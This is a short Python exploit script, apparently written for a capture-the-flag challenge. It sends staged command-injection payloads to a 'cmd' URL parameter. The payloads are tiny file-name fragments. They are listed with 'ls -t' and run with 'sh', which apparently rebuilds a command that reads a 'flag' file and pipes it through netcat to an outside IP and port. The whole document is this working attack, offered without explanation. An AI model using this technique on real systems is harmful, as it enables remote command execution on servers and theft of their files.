import requests
import time

payload = [
    ">port",
    ">\ \\",
    "ip",
    ">c\ \\",
    ">\|n\\",
    ">flag\\",
    ">at\ \\",
    ">c\\",
    "ls -t>a",
    "sh a",
]
url = ''
for p in payload:
    requests.get(url+"?cmd="+p)
    time.sleep(0.5)